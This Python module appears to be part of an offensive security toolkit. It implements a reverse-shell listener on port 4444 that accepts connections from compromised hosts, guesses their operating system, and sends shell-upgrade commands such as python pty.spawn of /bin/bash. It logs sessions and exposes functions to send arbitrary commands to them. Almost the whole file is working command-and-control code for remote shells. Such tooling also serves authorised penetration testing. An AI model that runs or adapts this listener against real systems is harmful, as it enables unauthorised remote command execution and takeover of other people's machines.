import os
import socket
import threading
import time
from . import shell_db


# --- debug logging -----------------------------------------------------------
_proj_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
_DBG_FILE = os.path.join(_proj_root, "databases", "debugging_logs")
_DBG_LOCK = threading.Lock()


def _dbg(msg):
    line = f"{time.strftime('%H:%M:%S')}  {msg}\n"
    try:
        with _DBG_LOCK:
            os.makedirs(os.path.dirname(_DBG_FILE), exist_ok=True)
            with open(_DBG_FILE, "a") as f:
                f.write(line)
    except (PermissionError, OSError):
        pass
# ---------------------------------------------------------------------------


class ShellListener:
    def __init__(self, port=4444, on_new_session=None):
        self._port = port
        self._on_new_session = on_new_session
        self._running = False
        self._thread = None
        self._sock = None

    @property
    def port(self):
        return self._port

    @property
    def is_running(self):
        return self._running

    def start(self):
        if self._running:
            return
        self._running = True
        _dbg(f"[shell-listener] starting on port {self._port}")
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False
        _dbg("[shell-listener] stopping")
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass

    def _run(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.settimeout(1)
        try:
            self._sock.bind(("0.0.0.0", self._port))
            self._sock.listen(5)
            _dbg(f"[shell-listener] bound to 0.0.0.0:{self._port}")
        except OSError as e:
            if self._on_new_session:
                self._on_new_session(error=str(e))
            self._running = False
            return

        while self._running:
            try:
                conn, addr = self._sock.accept()
                ip, port = addr
                _dbg(f"[shell-listener] new connection from {ip}:{port}")
                session = shell_db.add_session(ip, port, self._port)
                shell_db.set_socket(session["id"], conn)
                t = threading.Thread(target=self._handle_session,
                                     args=(session["id"], conn), daemon=True)
                t.start()
                if self._on_new_session:
                    self._on_new_session(session=session)
            except socket.timeout:
                continue
            except OSError:
                break

        try:
            self._sock.close()
        except Exception:
            pass

        for s in shell_db.get_all():
            if s["status"] == "connected":
                shell_db.set_status(s["id"], "disconnected")
                try:
                    s["socket"].close()
                except Exception:
                    pass

    def _detect_os(self, sid, conn):
        _dbg(f"[shell #{sid}] detecting OS...")
        buffered = b""
        try:
            for _ in range(6):
                time.sleep(0.1)
                try:
                    data = conn.recv(4096)
                    if data:
                        buffered += data
                        text = data.decode(errors="replace").lower()
                        if any(kw in text for kw in ("c:\\", "windows", "microsoft", "ps c:\\", "powershell", "cmd>")):
                            _dbg(f"[shell #{sid}] OS detected: windows")
                            if buffered:
                                shell_db.append_output(sid, buffered)
                            return "windows"
                        _dbg(f"[shell #{sid}] OS detected: unix (prompt: {text[:60].strip()})")
                        if buffered:
                            shell_db.append_output(sid, buffered)
                        return "unix"
                except socket.timeout:
                    continue
        except OSError:
            pass
        _dbg(f"[shell #{sid}] OS detection timeout, assuming unix")
        if buffered:
            shell_db.append_output(sid, buffered)
        return "unix"

    def _upgrade_shell(self, conn):
        _dbg("[shell] attempting PTY upgrade...")
        try:
            conn.sendall(b"stty raw -echo rows 50 cols 120 2>/dev/null; export TERM=dumb\n")
            time.sleep(0.1)
            conn.sendall(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || script -qc /bin/bash /dev/null 2>/dev/null\n")
            time.sleep(0.4)
            conn.sendall(b"stty rows 50 cols 120 2>/dev/null\n")
            time.sleep(0.1)
            _dbg("[shell] PTY upgrade commands sent")
        except OSError as e:
            _dbg(f"[shell] PTY upgrade error: {e}")

    def _handle_session(self, sid, conn):
        conn.settimeout(0.1)
        shell_os = self._detect_os(sid, conn)
        shell_db.set_os(sid, shell_os)
        if shell_os == "unix":
            self._upgrade_shell(conn)
        conn.settimeout(0.5)
        _dbg(f"[shell #{sid}] handler started (os={shell_os})")
        try:
            while self._running and shell_db.get_session(sid) and shell_db.get_session(sid).get("active"):
                try:
                    data = conn.recv(4096)
                    if not data:
                        _dbg(f"[shell #{sid}] connection closed by remote")
                        break
                    shell_db.append_output(sid, data)
                except socket.timeout:
                    continue
                except OSError as e:
                    _dbg(f"[shell #{sid}] recv error: {e}")
                    break
        finally:
            _dbg(f"[shell #{sid}] handler stopped")
            shell_db.set_status(sid, "disconnected")
            try:
                conn.close()
            except Exception:
                pass


def send_command(sid, cmd):
    session = shell_db.get_session(sid)
    if not session or session["status"] != "connected":
        _dbg(f"[shell #{sid}] send_command failed: not connected")
        return False
    sock = session.get("socket")
    if not sock:
        return False
    try:
        if isinstance(cmd, str):
            cmd_bytes = (cmd + "\n").encode()
        else:
            cmd_bytes = cmd
        sock.sendall(cmd_bytes)
        _dbg(f"[shell #{sid}] sent command ({len(cmd_bytes)} bytes)")
        return True
    except OSError as e:
        _dbg(f"[shell #{sid}] send_command error: {e}")
        shell_db.set_status(sid, "disconnected")
        return False


def send_raw(sid, data):
    session = shell_db.get_session(sid)
    if not session or session["status"] != "connected":
        _dbg(f"[shell #{sid}] send_raw failed: not connected")
        return False
    sock = session.get("socket")
    if not sock:
        return False
    try:
        if isinstance(data, str):
            data = data.encode()
        sock.sendall(data)
        _dbg(f"[shell #{sid}] sent raw ({len(data)} bytes)")
        return True
    except OSError as e:
        _dbg(f"[shell #{sid}] send_raw error: {e}")
        shell_db.set_status(sid, "disconnected")
        return False
